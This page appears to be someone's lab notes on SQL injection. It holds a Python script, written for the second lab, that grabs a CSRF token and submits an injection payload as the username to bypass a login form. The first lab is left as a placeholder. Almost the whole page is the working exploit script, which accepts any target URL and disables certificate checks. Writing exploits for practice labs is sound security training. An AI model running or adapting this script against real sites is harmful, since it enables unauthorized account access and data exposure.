---
description: Here are the automated exploits for all SQLi labs
---

# Automated Exploits

### Lab 1 (to be added)



***

### Lab 2

```python
import httpx
import sys
from bs4 import BeautifulSoup

proxies = "http://127.0.0.1:8080"

def get_csrf_token(client, url):
    r = client.get(url)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def exploit_sqli(client, url, payload):
    csrf = get_csrf_token (client, url)
    data = {"csrf": csrf, "username": payload, "password": "anytextworks"}

    r = client.post(url, data=data)
    if "Log out" in r.text:
        return True
    else:
        return False
    

if __name__ == "__main__":
    try:
        url = sys.argv[1]
        payload = sys.argv[2]
    except IndexError:
        print("[-] Usage: %s url payload" % sys.argv[0])
        print('[-] Usage: %s www.test.com "1=1"' % sys.argv[0])

    with httpx.Client(proxy = proxies, verify=False, follow_redirects = True) as client:
        if exploit_sqli(client, url, payload):
            print("[+] SQLi attack successful! Logged in as administrator")
        else:
            print("[-] SQLi attack was unsuccessful")
```

